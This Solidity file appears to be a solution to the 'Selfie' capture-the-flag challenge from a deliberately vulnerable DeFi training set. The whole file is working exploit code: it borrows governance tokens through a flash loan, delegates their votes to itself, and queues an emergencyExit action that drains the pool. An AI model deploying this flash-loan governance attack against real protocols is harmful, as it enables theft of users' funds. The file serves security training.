// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;
import {SimpleGovernance} from "../src/SimpleGovernance.sol";
import {DamnValuableVotes} from "../src/DamnValuableVotes.sol";
import {console2} from "forge-std/Test.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SelfiePool} from "../src/SelfiePool.sol";

contract Attack is IERC3156FlashBorrower {
    SimpleGovernance simpleGovernance;
    DamnValuableVotes dvt;
    SelfiePool pool;

    uint256 public actionId;

    constructor(
        SimpleGovernance _simpleGovernance,
        DamnValuableVotes _token,
        SelfiePool _pool
    ) {
        simpleGovernance = _simpleGovernance;
        dvt = _token;
        pool = _pool;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // get voting power
        dvt.delegate(address(this));

        actionId = simpleGovernance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", address(this))
        );

        dvt.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() external {
        simpleGovernance.executeAction(actionId);
    }

    fallback() external payable {}
}
